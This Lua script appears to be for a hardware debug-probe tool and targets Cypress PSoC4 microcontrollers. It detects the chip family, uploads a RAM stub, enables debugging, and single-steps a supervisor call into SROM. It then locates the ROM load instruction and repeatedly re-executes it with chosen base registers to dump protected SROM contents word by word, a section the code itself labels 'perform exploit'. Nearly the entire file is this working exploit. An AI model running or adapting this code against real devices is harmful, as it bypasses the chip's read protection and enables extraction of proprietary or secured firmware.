PSOC_CPUID_REG_ADDR					= 0xF0000FE0
PSOC41xx_42xx_ADDR_CPUSS_BASE		= 0x40000000
PSOC_OTHERS_ADDR_CPUSS_BASE			= 0x40100000

RAM_CODE_LOCATION					= 0x20000080
RAM_CODE							= 0x5088
RAM_LOC_STACK_TOP					= 0x20000700
SYSCALL_NUM							= 0x1234
MAX_STEPS							= 0x32
MAX_OFST							= 0x7C

PSOC4xxx_ADDROFST_CPUSS_SYSREQ		= 0x00000004
PSOC4xxx_SYSREQ_BIT_SYSCALL_REQ		= 0x80000000
PSOC4xxx_SYSREQ_BIT_ROM_ACCESS_EN	= 0x20000000

DHCSR_BITS_KEY						= 0xa05f0000
DHCSR_BITS_WRITEABLE				= 0x0000ffff
DHCSR_BIT_DEBUGEN					= 0x00000001

ADDR_DHCSR							= 0xE000EDF0
ADDR_DEMCR							= 0xE000EDFC

function psoc4Idenfiy()

	ret = cpuWordRead(PSOC_CPUID_REG_ADDR)

	if not ret then
		error(" Failed to read PSoC romtab CPUID")
	end
	
	if (ret >> 8) ~= 0 then
		error(string.format(" PSoC romtab CPUID invalid 0x%08X", ret))
	end
	
	family = ret;
	
	cpuss = PSOC_OTHERS_ADDR_CPUSS_BASE
	if family == 0x93 then
		print(" PSoC4100/4200 detected")
		cpuss = PSOC41xx_42xx_ADDR_CPUSS_BASE
	elseif family == 0x9E then
		print(" CYBL10x6x (PSoC4000-BLE?) detected")
	elseif family == 0x9A then
		print(" PSoC4000 detected")
	elseif family == 0xA1 then
		print(" PSoC4100M/4200M detected")
	elseif family == 0xA9 then
		print(" PSoC4000S detected")
	else
		print(string.format(" Unknown PSoC 0x%02X detected. Assuming CPUSS 0x%08X\n", family, cpuss))
	end
	
	--[[
		other known vals:
		AE, A3, AA - PSoC_BLE of some type
		
		69 - PSoC5
		A0 - 4200L
		A7 - 4200D ? 
		AB - 4100S
		AC - analog coprocessor (aka PSoC4400)
	--]]
	
	return family, cpuss
	
end


function main(step, haveDbg, haveCpu, haveScpt)

	if step == TOOL_OP_STEP_PRE_SCRIPT then
	
		if not cpuStop() then
			error(" Failed to stop cpu")
		end
	
		family, cpussBase = psoc4Idenfiy()
		
		if not cpuWordWrite(RAM_CODE_LOCATION, RAM_CODE) then
			error(" Failed to upload code")
		end
		
		--prepare DEMCR
		val = cpuWordRead(ADDR_DEMCR)
		if not val then
			error(" Failed to read DEMCR")
		end
		val = val | (1 << 24)	--DWT on
		if not cpuWordWrite(ADDR_DEMCR, val) then
			error(" Failed to write DEMCR")
		end
		
		--prepare DHCSR
		val = cpuWordRead(ADDR_DHCSR)
		if not val then
			error(" Failed to read DHCSR")
		end
		val = DHCSR_BITS_KEY | (val & DHCSR_BITS_WRITEABLE) | DHCSR_BIT_DEBUGEN	--enable debugging
		if not cpuWordWrite(ADDR_DHCSR, val) then
			error(" Failed to write DHCSR")
		end
		
		--prepare to run it (stack for exception return)
		for i = 0,15 do
			if not cpuRegSet(i, 0x5a5a0000 + (i + 1)) then
				error(string.format(" Failed to pre-set R%02d", i))
			end
		end
		val = cpussBase + PSOC4xxx_ADDROFST_CPUSS_SYSREQ;
		if not cpuRegSet(0, PSOC4xxx_SYSREQ_BIT_SYSCALL_REQ + SYSCALL_NUM) then
			error(" Failed to set R0")
		end
		if not cpuRegSet(1, (val // 2) | 1) then
			error(" Failed to set R1")
		end
		if not cpuRegSet(2, val - ((val // 2) | 1)) then
			error(" Failed to set R2")
		end
		if not cpuRegSet(13, RAM_LOC_STACK_TOP) then
			error(" Failed to set SP")
		end
		targetNextPc = RAM_CODE_LOCATION + 1
		if not cpuRegSet(15, RAM_CODE_LOCATION + 1) then
			error(" Failed to set PC")
		end

		--perform exploit
		offsets = {}
		for i = 0,MAX_STEPS do
		
			if i == MAX_STEPS then
				error(" No luck after reaching maximum steps. Giving up")
			end
		
			targetPc = targetNextPc
			
			if not cpuStep() then
				error(string.format(" step %u of exploit part 1 fail", i))
			end
			print(string.format(" Step %u ... ", i))
			targetNextPc = cpuRegGet(15)
			if not targetNextPc then
				error(" Failed to read PC")
			end
			
			if (targetNextPc & 0xfff00000) ~= 0x10000000 then
				print(string.format("  PC 0x%08X not in SROM", targetNextPc))
			else
			
				--loads can only happen ot low regs
				targetReg = nil
				for testReg = 0,7 do
					val = cpuRegGet(testReg)
					if not val then
						error(string.format("  Failed to read R%02u", testReg))
					end
					if val == PSOC4xxx_SYSREQ_BIT_SYSCALL_REQ + PSOC4xxx_SYSREQ_BIT_ROM_ACCESS_EN + SYSCALL_NUM then
						targetReg = testReg
						break
					end
				end
				if not targetReg then
					print("  Syscall Num not found in any register")
				else
				
					print(string.format("  Syscall Num found in R%u", targetReg))
					
					for j = 0,7 do
					
						offsets[j] = -1
						if j ~= targetReg then
						
							val = cpuRegGet(j)
							if not val then
								error(string.format("   Failed to read R%02u", testReg))
							end
							ofst = cpussBase + PSOC4xxx_ADDROFST_CPUSS_SYSREQ - val
						
							if ofst >= 0 and ofst <= MAX_OFST then
							
								offsets[j] = ofst
								print(string.format("   Potential base reg: R%u (0x%08X, ofst 0x%02X)", j, val, ofst))
							end
						end
					end
					break
				end
			end
		end
		
		j = nil
		for i = 0,7 do
			if offsets[i] >= 0 then
				j = i
			end
		end
		if not j then
			error(" No offsets found. Giving up")
		end
		
		io.write(string.format(" Will exploit suspected load at 0x%08X with target(s): ", targetPc))
		for i = 0,7 do
			if offsets[i] == 0 then
				io.write(string.format(" [R%u]", i))
			elseif offsets[i] > 0 then
				io.write(string.format(" [R%u, #0x%02X]", i, offsets[i]))
			end
		end
		io.write("\n")
		
		for i = 0x10000000,0x10010000,4 do	--very large range to make sure we get it all
		
			--set regs
			for j = 0,7 do
				if offsets[j] >= 0 then
					if not cpuRegSet(j, i - offsets[j]) then
						error(string.format("  Failed to set R%u to 0x%08X", j, i - offsets[j]))
					end
				end
			end
			if not cpuRegSet(15, targetPc) then
				error("  Failed to set PC")
			end
			
			--step
			if not cpuStep() then
				error("  Step failed")
			end
			val = cpuRegGet(15)
			if val == 0xfffffffe then
				print("  PC of 0xFFFFFFFE means we're not able to read anymore. Bailing...")
				break
			elseif targetNextPc ~= val then
				error(string.format("  PC of 0x%08X not as expected (0x%08X)", val, targetNextPc))
			end
			
			val = cpuRegGet(targetReg)
			if not val then
				error(string.format("  Failed to read R%u", targetReg))
			end
				
			print(string.format("  [0x%08X] = 0x%08X", i, val))
		end
		
		
		cpuReset()
		
	end
	
	return true
end

function init(params)

	return TOOL_OP_NEEDS_DEBUGGER | TOOL_OP_NEEDS_CPU
end